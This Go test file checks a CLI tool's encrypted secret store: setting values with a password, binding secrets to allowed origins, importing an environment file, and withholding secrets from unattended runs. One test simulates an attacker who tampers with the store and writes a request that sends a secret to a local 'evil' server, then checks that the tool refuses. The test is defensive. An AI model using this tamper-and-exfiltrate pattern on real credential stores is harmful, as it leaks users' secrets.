package cli

import (
	"bytes"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/vidforull/vegtam/internal/core/output"
)

// typist is a terminal where a person types each of answers in turn.
type typist struct {
	answers []string
	prompts []string
}

func (p *typist) ReadSecret(prompt string) ([]byte, error) {
	p.prompts = append(p.prompts, prompt)
	if len(p.answers) == 0 {
		return nil, errNoTerminal
	}
	a := p.answers[0]
	p.answers = p.answers[1:]
	return []byte(a), nil
}

// runTyped runs args as runCLI does, with a person who types answers at
// the terminal, stdin as given, and a person at it if person is set.
func runTyped(t *testing.T, person bool, stdin io.Reader, answers []string, args ...string) (code int, stdout, stderr string, p *typist) {
	t.Helper()
	p = &typist{answers: answers}
	var out, errOut bytes.Buffer
	code = Run(t.Context(), args, Config{
		Stdin: stdin, Stdout: &out, Stderr: &errOut, TTY: person, Interactive: person, Version: "v1.2.3", local: testKeeper, term: p,
		protect: func() []string { return nil }, // a keeper would protect the tests' process
	})
	return code, out.String(), errOut.String(), p
}

// storeDoc returns the store that the JSON document s holds.
func storeDoc(t *testing.T, s string) *output.Store {
	t.Helper()
	validateJSON(t, s)
	var doc output.Document
	decode(t, s, &doc)
	if doc.Store == nil {
		t.Fatalf("no store in %s", s)
	}
	return doc.Store
}

const storeValue = "St0re/v4lue+x"

// TestSecretCommands checks vegtam secret: a store made with a password
// typed twice, values typed or read from stdin, origins allowed and
// denied, a secret taken out, a wrong password; the names and origins
// listed without a password; and no value anywhere in the output or in
// the file.
func TestSecretCommands(t *testing.T) {
	dir := writePolicy(t, `{}`)
	path := filepath.Join(dir, "secrets.enc")
	code, stdout, _, _ := runTyped(t, false, nil, nil, "secret", "list")
	if s := storeDoc(t, stdout); code != exitOK || s.Exists || s.Path != path || len(s.Secrets) != 0 {
		t.Errorf("list without a store = %d\n%s", code, stdout)
	}
	// The passwords differ: no store.
	code, _, stderr, _ := runTyped(t, false, nil, []string{storeValue, "pw-one", "pw-two"}, "secret", "set", "token")
	if _, err := os.Stat(path); code != exitUsage || !strings.Contains(stderr, "the two passwords differ") || err == nil {
		t.Errorf("set with two passwords = %d, %s, %v", code, stderr, err)
	}
	code, stdout, stderr, p := runTyped(t, false, nil, []string{storeValue, "correct horse", "correct horse"}, "secret", "set", "token")
	if s := storeDoc(t, stdout); code != exitOK || !s.Exists || !slices.Equal(names(s), []string{"token"}) || len(s.Secrets[0].Allowed) != 0 {
		t.Errorf("set = %d\n%s\n%s", code, stdout, stderr)
	}
	if !slices.Equal(p.prompts, []string{"value of token: ", "new password for the store of secrets (" + path + "): ", "the same again: "}) {
		t.Errorf("prompts %q", p.prompts)
	}
	if fi, err := os.Stat(path); err != nil || fi.Mode().Perm() != 0o600 {
		t.Errorf("the store: %v, %v", fi, err)
	}
	// From stdin, less the final line break.
	code, _, stderr, _ = runTyped(t, false, strings.NewReader("other "+storeValue+"\n"), []string{"correct horse"}, "secret", "set", "key", "--stdin")
	if code != exitOK {
		t.Errorf("set --stdin = %d, %s", code, stderr)
	}
	code, stdout, stderr, _ = runTyped(t, false, nil, []string{"correct horse"}, "secret", "allow", "token", "https://API.example.com/", "http://127.0.0.1:8080")
	if s := storeDoc(t, stdout); code != exitOK || !slices.Equal(s.Secrets[1].Allowed, []string{"http://127.0.0.1:8080", "https://api.example.com"}) {
		t.Errorf("allow = %d\n%s\n%s", code, stdout, stderr)
	}
	code, _, stderr, _ = runTyped(t, false, nil, []string{"correct horse"}, "secret", "allow", "token", "https://*.example.com")
	if code != exitUsage || !strings.Contains(stderr, "a wildcard names none") {
		t.Errorf("allow a wildcard = %d, %s", code, stderr)
	}
	code, stdout, _, _ = runTyped(t, false, nil, []string{"correct horse"}, "secret", "deny", "token", "http://127.0.0.1:8080")
	if s := storeDoc(t, stdout); code != exitOK || !slices.Equal(s.Secrets[1].Allowed, []string{"https://api.example.com"}) {
		t.Errorf("deny = %d\n%s", code, stdout)
	}
	code, _, stderr, _ = runTyped(t, false, nil, []string{"wrong"}, "secret", "rm", "key")
	if code != exitUsage || !strings.Contains(stderr, "wrong password, or the file was changed") {
		t.Errorf("rm with a wrong password = %d, %s", code, stderr)
	}
	code, stdout, _, _ = runTyped(t, false, nil, []string{"correct horse"}, "secret", "rm", "key")
	if s := storeDoc(t, stdout); code != exitOK || !slices.Equal(names(s), []string{"token"}) {
		t.Errorf("rm = %d\n%s", code, stdout)
	}
	code, _, stderr, _ = runTyped(t, false, nil, []string{"correct horse"}, "secret", "rm", "key")
	if code != exitUsage || !strings.Contains(stderr, "the store holds no secret key") {
		t.Errorf("rm again = %d, %s", code, stderr)
	}
	// Listed as text, and without a password.
	code, stdout, _, p = runTyped(t, true, nil, nil, "secret", "list")
	if code != exitOK || stdout != "token  https://api.example.com\n" || len(p.prompts) != 0 {
		t.Errorf("list = %d\n%q, prompts %q", code, stdout, p.prompts)
	}
	// Without a terminal, nothing that needs a password or a value.
	code, _, stderr, _ = runTyped(t, false, nil, nil, "secret", "set", "x")
	if code != exitUsage || !strings.Contains(stderr, "no terminal to type it at") {
		t.Errorf("set without a terminal = %d, %s", code, stderr)
	}
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(b), "St0re") || !strings.Contains(string(b), `"names": [`) {
		t.Errorf("the store's file:\n%s", b)
	}
}

// got reports whether the server got the raw query q since from, the
// length of fx.seen then.
func (fx *fixture) got(from int, q string) bool {
	fx.mu.Lock()
	defer fx.mu.Unlock()
	return slices.Contains(fx.seen[from:], q)
}

// names returns the names of the secrets of s.
func names(s *output.Store) []string {
	var out []string
	for _, x := range s.Secrets {
		out = append(out, x.Name)
	}
	return out
}

// TestSecretImport checks that vegtam secret import puts the values of a
// private environment file in the store, with the origins of its $allow,
// leaves the file as it was, and says so; and that a person's run then
// takes a value from the store, once the private file no longer holds it,
// asking for the password once, while a run without a person gets none.
func TestSecretImport(t *testing.T) {
	fx := newFixture(t)
	dir := writePolicy(t, fx.policy(`{"network": {"allow": ["127.0.0.1"]}, "secrets": {"unattended": "deny"}}`))
	private := fx.path("http-client.private.env.json")
	before, err := os.ReadFile(private)
	if err != nil {
		t.Fatal(err)
	}
	code, stdout, stderr, _ := runTyped(t, false, nil, []string{"pw", "pw"}, "secret", "import", private)
	s := storeDoc(t, stdout)
	if code != exitOK || !slices.Equal(s.Imported, []string{"base", "live", "token"}) || s.From != private+" (test)" ||
		!slices.Equal(names(s), s.Imported) || !slices.Equal(s.Secrets[2].Allowed, slices.Compact(slices.Sorted(slices.Values(fx.origins)))) {
		t.Errorf("import = %d\n%s\n%s", code, stdout, stderr)
	}
	if after, err := os.ReadFile(private); err != nil || !bytes.Equal(after, before) {
		t.Errorf("the private file changed: %v", err)
	}
	code, stdout, _, _ = runTyped(t, true, nil, []string{"pw"}, "secret", "import", private, "-e", "test")
	if code != exitOK || !strings.Contains(stdout, "Put 3 secrets of "+private+" (test) in the store: base, live, token.\nThe file still holds them") {
		t.Errorf("import as text = %d\n%s", code, stdout)
	}
	if code, _, stderr, _ = runTyped(t, false, nil, []string{"pw"}, "secret", "import", private, "-e", "prod"); code != exitUsage ||
		!strings.Contains(stderr, `environment "prod" is not defined (defined: test)`) {
		t.Errorf("import -e prod = %d, %s", code, stderr)
	}

	// Without the private file, a person's run takes the token from the
	// store, and asks for its password once.
	if err := os.Remove(private); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(fx.path("stored.http"), []byte("GET {{host}}/echo?key={{token}}\n\n###\nGET {{host}}/echo?again={{token}}\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	from := fx.seenCount()
	code, stdout, stderr, p := runTyped(t, true, nil, []string{"pw"}, "run", fx.path("stored.http"), "-e", "test")
	if code != exitOK || len(p.prompts) != 1 || p.prompts[0] != "password of the store of secrets ("+filepath.Join(dir, "secrets.enc")+"): " ||
		!fx.got(from, "key="+privateSecret) || len(fx.leaks(stdout+stderr)) > 0 {
		t.Errorf("a person's run = %d, prompts %q\n%s\n%s", code, p.prompts, stdout, stderr)
	}
	// A wrong password: the request is not sent, and no other value is.
	code, _, stderr, _ = runTyped(t, true, nil, []string{"wrong"}, "run", fx.path("stored.http")+"#1", "-e", "test")
	if code == exitOK || !strings.Contains(stderr, "wrong password") {
		t.Errorf("a wrong password = %d, %s", code, stderr)
	}
	// A dry run asks for no password; a run without a person gets no
	// value, and knows where it may go.
	code, _, _, p = runTyped(t, true, nil, nil, "run", fx.path("stored.http")+"#1", "-e", "test", "--dry-run")
	if code != exitOK || len(p.prompts) != 0 {
		t.Errorf("a dry run = %d, prompts %q", code, p.prompts)
	}
	code, stdout, _, p = runTyped(t, false, nil, []string{"pw"}, "run", fx.path("stored.http")+"#1", "-e", "test")
	validateJSON(t, stdout)
	var doc output.Document
	decode(t, stdout, &doc)
	if e := doc.Result.Error; code != exitPolicy || len(p.prompts) != 0 || e == nil || e.Secret == nil || e.Secret.Name != "{{token}}" ||
		len(e.Secret.Allowed) == 0 || e.PersonCommand == "" {
		t.Errorf("without a person = %d, prompts %q\n%s", code, p.prompts, stdout)
	}
}

// hook is a terminal that runs before each line it gives.
type hook struct {
	typist
	before func()
}

func (h *hook) ReadSecret(prompt string) ([]byte, error) {
	h.before()
	return h.typist.ReadSecret(prompt)
}

// TestSecretStoreChanged checks that a person's run refuses the store
// when it does not hold, once its password opens it, the origins its
// header gave when the run began: a process that adds an origin to the
// header, and puts the file back while the person types, sends nothing
// where the secret is not bound.
func TestSecretStoreChanged(t *testing.T) {
	fx := newFixture(t)
	evil := httptest.NewServer(http.HandlerFunc(func(http.ResponseWriter, *http.Request) { t.Error("the evil server got a request") }))
	t.Cleanup(evil.Close)
	for _, step := range [][]string{{"set", "stored"}, {"allow", "stored", fx.host}} {
		answers := []string{"pw"}
		if step[0] == "set" {
			answers = []string{storeValue, "pw", "pw"}
		}
		if code, _, stderr, _ := runTyped(t, false, nil, answers, append([]string{"secret"}, step...)...); code != exitOK {
			t.Fatalf("secret %s = %d, %s", step[0], code, stderr)
		}
	}
	path := filepath.Join(fx.config, "secrets.enc")
	good, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	var f map[string]any
	decode(t, string(good), &f)
	f["origins"] = map[string][]string{"stored": slices.Sorted(slices.Values([]string{evil.URL, fx.host}))}
	bad, _ := json.Marshal(f)
	if err := os.WriteFile(path, bad, 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(fx.path("evil.http"), []byte("GET "+evil.URL+"/?k={{stored}}\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	h := &hook{answers: []string{"pw"}, before: func() {
		if err := os.WriteFile(path, good, 0o600); err != nil {
			t.Error(err)
		}
	}}
	var out, errOut bytes.Buffer
	code := Run(t.Context(), []string{"run", fx.path("evil.http"), "-e", "test"}, Config{
		Stdout: &out, Stderr: &errOut, TTY: true, Interactive: true, term: h, protect: func() []string { return nil },
	})
	if code != exitPolicy || !strings.Contains(errOut.String(), "changed since this run read where its secrets may go") {
		t.Errorf("run = %d\n%s\n%s", code, out.String(), errOut.String())
	}
}
